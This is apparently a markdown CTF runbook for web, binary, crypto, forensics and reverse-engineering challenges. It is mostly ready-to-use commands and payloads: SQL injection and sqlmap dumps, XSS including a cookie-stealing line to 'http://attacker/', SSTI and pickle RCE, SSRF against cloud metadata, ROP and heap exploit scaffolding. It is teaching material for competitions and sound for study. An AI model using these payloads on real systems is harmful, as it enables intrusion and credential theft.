# CTF Methodology (Capture The Flag Competition Runbook)

> For authorized security testing, CTF competitions, and educational purposes only.

A systematic approach to Capture The Flag competitions covering all major categories:
web exploitation, binary exploitation (pwn), cryptography, forensics, reverse engineering,
and miscellaneous challenges. This runbook provides category-specific techniques, tool
selection, time management strategies, and team coordination patterns for both Jeopardy
and Attack-Defense format CTFs.

---

## Web Exploitation

### SQL Injection

```bash
# Manual SQLi detection
# Append to parameters: ' " ; -- /* */ OR 1=1
curl "http://target/login?user=admin'--&pass=x"
curl "http://target/search?q=test' UNION SELECT null,null,null--"

# Determine column count
curl "http://target/search?q=' ORDER BY 1--"
curl "http://target/search?q=' ORDER BY 5--"  # increase until error

# Extract data via UNION
curl "http://target/search?q=' UNION SELECT table_name,null FROM information_schema.tables--"
curl "http://target/search?q=' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--"
curl "http://target/search?q=' UNION SELECT username,password FROM users--"

# Blind SQLi — boolean-based
curl "http://target/page?id=1 AND SUBSTRING(database(),1,1)='c'"

# Blind SQLi — time-based
curl "http://target/page?id=1; IF(1=1,SLEEP(5),0)"

# sqlmap automation
sqlmap -u "http://target/page?id=1" --dbs --batch
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump
sqlmap -r request.txt --level 5 --risk 3 --batch
```

### XSS and SSTI

```bash
# Reflected XSS probes
curl "http://target/search?q=<script>alert(1)</script>"
curl "http://target/search?q=<img src=x onerror=alert(1)>"
curl "http://target/search?q=<svg onload=alert(1)>"

# Filter bypass payloads
# <ScRiPt>alert(1)</ScRiPt>
# <img src=x onerror="alert(1)">
# javascript:alert(1)
# <details open ontoggle=alert(1)>

# Steal cookies via XSS
# <script>document.location='http://attacker/?c='+document.cookie</script>

# Server-Side Template Injection (SSTI)
# Detect: {{7*7}} -> 49, ${7*7} -> 49
curl "http://target/render?name={{7*7}}"

# Jinja2 RCE
# {{''.__class__.__mro__[1].__subclasses__()}}
# {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig RCE
# {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

### SSRF and Deserialization

```bash
# SSRF — probe internal services
curl "http://target/fetch?url=http://127.0.0.1:6379/"    # Redis
curl "http://target/fetch?url=http://169.254.169.254/"    # AWS metadata
curl "http://target/fetch?url=file:///etc/passwd"         # Local file read
curl "http://target/fetch?url=gopher://127.0.0.1:25/"     # Gopher SMTP

# SSRF bypass techniques
# http://0x7f000001/       (hex IP)
# http://2130706433/       (decimal IP)
# http://[::1]/            (IPv6 loopback)
# http://target@127.0.0.1/ (URL authority confusion)

# PHP deserialization
# Identify: unserialize() on user input
# Craft payload with gadget chains
php -r 'echo serialize(new ExploitClass());' | base64

# Java deserialization
# ysoserial — generate exploit payloads
java -jar ysoserial.jar CommonsCollections1 'id' | base64
# Look for: ObjectInputStream, readObject(), .ser files
# Magic bytes: AC ED 00 05 (Java serialized) or rO0AB (base64)

# Python pickle deserialization
python3 -c "
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
print(pickle.dumps(Exploit()).hex())
"
```

---

## Binary Exploitation (Pwn)

### Buffer Overflow Basics

```bash
# Find buffer overflow offset
python3 -c "print('A'*200)" | ./vulnerable

# Use pwntools cyclic pattern
python3 -c "from pwn import *; print(cyclic(200).decode())" | ./vulnerable
# After crash: cyclic_find(0x61616167)  -> offset = 24

# Check binary protections
checksec --file=./vulnerable
# RELRO, Stack Canary, NX, PIE, FORTIFY

# Simple ret2win (overwrite return address)
python3 -c "
from pwn import *
elf = ELF('./vulnerable')
payload = b'A' * offset + p64(elf.sym['win_function'])
print(payload)
" | ./vulnerable

# ret2libc (bypass NX)
python3 << 'EOF'
from pwn import *
elf = ELF('./vulnerable')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])     # leak libc address
rop.call(elf.sym['main'])                # return to main
# ... send payload, parse leak, compute system() address
EOF
```

### ROP and Format Strings

```bash
# ROP gadget finding
ROPgadget --binary ./vulnerable | grep "pop rdi"
ropper -f ./vulnerable --search "pop rdi"

# ROP chain construction with pwntools
python3 << 'EOF'
from pwn import *
elf = ELF('./vulnerable')
rop = ROP(elf)
rop.raw(rop.find_gadget(['pop rdi', 'ret'])[0])
rop.raw(next(elf.search(b'/bin/sh')))
rop.raw(elf.sym['system'])
print(rop.dump())
EOF

# Format string exploitation
# Leak stack values
python3 -c "print('%p.' * 20)" | ./vulnerable

# Read arbitrary address
python3 -c "
from pwn import *
addr = p64(0x404040)
print((addr + b'%7\$s').decode('latin-1'))
" | ./vulnerable

# Write with %n
# %<value>c%<offset>$n writes <value> bytes count to address at <offset>
# Use pwntools fmtstr_payload() for automated exploitation
python3 -c "
from pwn import *
payload = fmtstr_payload(6, {0x404040: 0xdeadbeef})
print(payload)
"
```

### Heap Exploitation

```bash
# Heap analysis with GDB
gdb ./vulnerable
# gef> heap bins            # show all bin lists
# gef> heap chunks          # show allocated chunks
# gef> vis_heap_chunks      # visual heap layout

# Common heap techniques:
# - Use-After-Free: free chunk, allocate same size, control freed data
# - Double Free: free same chunk twice, corrupt freelist
# - Heap Overflow: overwrite adjacent chunk metadata
# - Tcache Poisoning (glibc 2.26+): corrupt tcache fd pointer
# - House of Force: overwrite top chunk size
# - Fastbin dup: double-free in fastbin for arbitrary alloc

# pwntools heap helpers
python3 << 'EOF'
from pwn import *
p = process('./vulnerable')
def alloc(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'size: ', str(size).encode())
    p.sendafter(b'data: ', data)
def free(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'idx: ', str(idx).encode())
# tcache poison example
alloc(0x20, b'AAAA')    # chunk 0
alloc(0x20, b'BBBB')    # chunk 1
free(0); free(1); free(0)  # double free
alloc(0x20, p64(target_addr))  # poison tcache
alloc(0x20, b'CCCC')
alloc(0x20, b'DDDD')    # allocated at target_addr
EOF
```

---

## Cryptography

### Classical and RSA

```bash
# XOR brute force (single-byte key)
python3 -c "
ct = bytes.fromhex('1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736')
for key in range(256):
    pt = bytes([b ^ key for b in ct])
    if all(32 <= c < 127 for c in pt):
        print(f'Key {key}: {pt.decode()}')"

# RSA: small public exponent (e=3, small message)
python3 -c "
from Crypto.Util.number import *
import gmpy2
c = <ciphertext>; e = 3
m = gmpy2.iroot(c, e)[0]
print(long_to_bytes(m))"

# RSA: factor n (small primes, close primes, shared factors)
python3 -c "
from factordb.factordb import FactorDB
f = FactorDB(<n>)
f.connect()
print(f.get_factor_list())"

# RSA: Wiener's attack (small d)
# Use owiener or RsaCtfTool
python3 -m owiener <n> <e>

# RSA: Hastad's broadcast attack (same m, different n, small e)
# Collect e ciphertexts, apply CRT, take e-th root
```

### AES and Padding Oracle

```bash
# AES-ECB detection (repeated ciphertext blocks)
python3 -c "
ct = bytes.fromhex('<hex_ciphertext>')
blocks = [ct[i:i+16] for i in range(0, len(ct), 16)]
if len(blocks) != len(set(blocks)):
    print('ECB mode detected — repeated blocks found')"

# Padding oracle attack
# Use padbuster or custom script
padbuster http://target/decrypt.php <encrypted_sample> 16 \
  -encoding 0 -error "Invalid padding"

# AES-CBC bit flipping
# Flip bit in ciphertext block N to change plaintext block N+1
# target_byte = original_byte ^ desired_byte ^ ciphertext_byte
python3 -c "
ct = bytearray.fromhex('<ciphertext>')
# Flip byte at position to change next block's plaintext
ct[target_pos] ^= ord('A') ^ ord('X')  # change A to X in next block
print(ct.hex())"

# Hash length extension attack
# pip install hashpumpy
python3 -c "
import hashpumpy
new_hash, new_msg = hashpumpy.hashpump(
    known_hash, known_data, append_data, key_length)
print(f'Hash: {new_hash}\nMessage: {new_msg.hex()}')"
```

---

## Forensics

### Disk and Memory Analysis

```bash
# Mount disk image
sudo mount -o loop,ro disk.img /mnt/evidence

# Autopsy / Sleuth Kit analysis
fls -r disk.img                    # list all files (including deleted)
icat disk.img <inode>              # extract file by inode
tsk_recover -e disk.img /output/   # recover all files

# File carving (recover deleted files)
foremost -i disk.img -o /output/
scalpel -c scalpel.conf disk.img -o /output/
photorec disk.img

# Volatility memory analysis (version 3)
vol3 -f memory.dmp windows.info        # system info
vol3 -f memory.dmp windows.pslist      # process list
vol3 -f memory.dmp windows.pstree      # process tree
vol3 -f memory.dmp windows.cmdline     # command lines
vol3 -f memory.dmp windows.netscan     # network connections
vol3 -f memory.dmp windows.filescan    # find file objects
vol3 -f memory.dmp windows.dumpfiles --pid <pid>  # extract files
vol3 -f memory.dmp windows.hashdump    # extract password hashes
vol3 -f memory.dmp windows.malfind     # find injected code

# Linux memory with Volatility
vol3 -f memory.lime linux.pslist
vol3 -f memory.lime linux.bash        # bash history from memory
```

### Network Forensics and Steganography

```bash
# PCAP analysis with tshark
tshark -r capture.pcap -Y "http" -T fields -e http.request.uri
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name
tshark -r capture.pcap -Y "ftp-data" -T fields -e data

# Extract files from PCAP
tshark -r capture.pcap --export-objects http,/output/
tshark -r capture.pcap --export-objects smb,/output/

# NetworkMiner (GUI) for automated extraction
# Wireshark: Follow TCP Stream for conversation reconstruction

# Steganography detection
file suspicious.png                    # check file type
exiftool suspicious.png                # metadata analysis
strings suspicious.png | head -50      # embedded strings
binwalk suspicious.png                 # embedded files/archives

# Image steganography tools
steghide extract -sf image.jpg -p ""           # empty password
stegsolve                                       # visual analysis (bit planes)
zsteg image.png                                 # LSB steganography
python3 -c "from PIL import Image; img=Image.open('image.png'); print([img.getpixel((x,0))[0]&1 for x in range(100)])"

# Audio steganography
sonic-visualiser audio.wav                      # spectrogram analysis
# Check spectrogram for hidden images or text
# SSTV decoding for ham radio challenges
```

---

## Reverse Engineering

### Static and Dynamic Analysis

```bash
# Initial binary analysis
file binary
strings binary | grep -i flag
strings binary | grep -iE 'password|secret|key|http'
objdump -d binary | head -100
readelf -a binary

# Ghidra headless decompilation
/opt/ghidra/support/analyzeHeadless /tmp/ctf CTFProject \
  -import binary \
  -postScript DecompileAll.java

# GDB dynamic analysis
gdb ./binary
# b main
# r
# ni / si (step over / step into)
# x/20x $rsp    (examine stack)
# x/s <addr>    (examine string)
# info registers
# set *<addr> = <value>

# ltrace / strace
ltrace ./binary         # library calls (strcmp, strlen, etc.)
strace ./binary         # system calls (open, read, write, etc.)

# Anti-debugging bypass in GDB
# set environment LD_PRELOAD=./fake_ptrace.so
# catch syscall ptrace -> commands -> set $rax=0 -> continue -> end

# angr symbolic execution
python3 << 'EOF'
import angr
proj = angr.Project('./binary', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simgr(state)
simgr.explore(find=0x401234, avoid=0x401256)
if simgr.found:
    print(simgr.found[0].posix.dumps(0))  # stdin that reaches target
EOF
```

---

## Miscellaneous

### OSINT and Encoding

```bash
# Common encodings
echo "ZmxhZ3t0ZXN0fQ==" | base64 -d          # base64
echo "666c61677b746573747d" | xxd -r -p        # hex
python3 -c "print(bytes([102,108,97,103]))"    # decimal ASCII

# Detect encoding automatically
python3 -c "
import base64, codecs
data = 'ZmxhZ3t0ZXN0fQ=='
try: print('b64:', base64.b64decode(data))
except: pass
try: print('b32:', base64.b32decode(data))
except: pass
try: print('b85:', base64.b85decode(data))
except: pass
try: print('hex:', bytes.fromhex(data))
except: pass"

# Morse code decoder
python3 -c "
morse = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E',
         '..-.':'F','--.':'G','....':'H','..':'I','.---':'J',
         '-.-':'K','.-..':'L','--':'M','-.':'N','---':'O',
         '.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T',
         '..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y',
         '--..':'Z'}
msg = '.... . .-.. .-.. ---'
print(''.join(morse.get(c,'?') for c in msg.split()))"

# OSINT tools
# Google dorks: site:target.com filetype:pdf
# Wayback Machine: web.archive.org
# EXIF GPS extraction: exiftool -gps* image.jpg
# Reverse image search: images.google.com, tineye.com
```

---

## Team Coordination

### CTF Workflow

```bash
# Team setup checklist:
# 1. Shared workspace (CTFd instance, Google Doc, or HedgeDoc)
# 2. Communication channel (Discord/Slack with category channels)
# 3. Shared credentials manager
# 4. VPN/network access verified for all members
# 5. Tool environments tested (Docker images pre-built)

# Role assignment by category:
# - 2 web specialists (SQLi/XSS/SSRF)
# - 1-2 pwn/RE specialists (binary exploitation)
# - 1 crypto specialist
# - 1 forensics/misc generalist
# - 1 floater (helps where needed, manages submissions)

# Time management for 48-hour CTF:
# Hour 0-2:    Triage all challenges, sort by points and difficulty
# Hour 2-8:    Attack low-hanging fruit (easy/medium challenges)
# Hour 8-24:   Focus on medium/hard, rotate blocked members
# Hour 24-40:  Deep dives on remaining high-value challenges
# Hour 40-48:  Final push, write-up documentation

# Flag submission tracking
# Log every attempt: challenge_name | flag_value | result | time
# Some CTFs rate-limit submissions — coordinate to avoid lockout
```

### Common Flag Formats

```bash
# Standard patterns:
# flag{...}
# CTF{...}
# FLAG{...}
# ASIS{...}       (ASIS CTF)
# picoCTF{...}    (picoCTF)
# HTB{...}        (HackTheBox)

# Search for flag patterns in data dumps
grep -rioE '[a-zA-Z0-9_]+\{[a-zA-Z0-9_!@#$%^&*()-]+\}' .
strings binary | grep -iE 'flag|ctf'
strings -e l binary     # 16-bit little-endian strings

# Automated flag search in memory dumps
vol3 -f memory.dmp windows.strings | grep -i "flag{"
```

---

## Platform-Specific Tips

### CTF Platforms

```bash
# CTFtime.org — global CTF calendar and rankings
# Register team, track events, read write-ups

# HackTheBox
# Connect: openvpn htb_connection.ovpn
# Machine enumeration: nmap -sC -sV <target_ip>
# Submit flags at web interface

# TryHackMe
# Built-in attack box (browser-based)
# or VPN: openvpn thm_connection.ovpn
# Guided rooms with step-by-step learning

# PicoCTF — beginner-friendly, great for learning
# OverTheWire (Bandit, Narnia, etc.) — progressive wargames

# Local practice:
docker pull ctfd/ctfd                              # self-hosted CTF platform
docker run -p 8000:8000 ctfd/ctfd                  # start instance
# Import challenge packs from CTFd marketplace
```

---

## Quick Reference Tables

### Tool Selection by Category

```bash
# Web:   Burp Suite, sqlmap, ffuf, Postman, curl
# Pwn:   pwntools, GDB+GEF, checksec, ROPgadget, one_gadget
# Crypto: SageMath, RsaCtfTool, hashcat, CyberChef, z3
# Forensics: Volatility, Autopsy, Wireshark, binwalk, foremost
# RE:    Ghidra, IDA, radare2, angr, ltrace/strace
# Misc:  CyberChef, dcode.fr, Python, ImageMagick

# Universal tools:
# CyberChef (https://gchq.github.io/CyberChef/) — encoding swiss army knife
# Python + pwntools — scripting everything
# Docker — isolated environments per challenge
```

---

## Tips

- Always read the challenge description carefully — hints are often embedded in the flavor text or title
- Start with the lowest-point challenges in each category to build momentum and identify quick wins
- Use CyberChef as your first stop for any encoding or transformation puzzle before writing custom code
- Keep a personal library of exploit scripts organized by category; CTF challenges recycle common patterns
- When stuck for more than 30 minutes on a single challenge, rotate to another and come back with fresh perspective
- Take screenshots and notes throughout — write-ups earn team reputation and help with future competitions
- Check for challenge updates and announcements; organizers sometimes release hints for unsolved challenges
- Test your exploit locally first if a binary is provided; avoid burning rate-limited remote attempts
- For web challenges, always check robots.txt, .git/, .env, backup files (.bak, ~, .swp), and source comments
- Run binwalk on every suspicious file regardless of stated type — CTF files are frequently containers within containers

---

## See Also

- pwntools
- web-attacks
- cryptography
- forensics
- reverse-engineering

## References

- [CTFtime.org — CTF Calendar and Rankings](https://ctftime.org/)
- [PicoCTF Learning Platform](https://picoctf.org/)
- [HackTheBox Academy](https://academy.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [OverTheWire Wargames](https://overthewire.org/wargames/)
- [CTF Field Guide (Trail of Bits)](https://trailofbits.github.io/ctf/)
- [CyberChef by GCHQ](https://gchq.github.io/CyberChef/)
- [pwntools Documentation](https://docs.pwntools.com/)
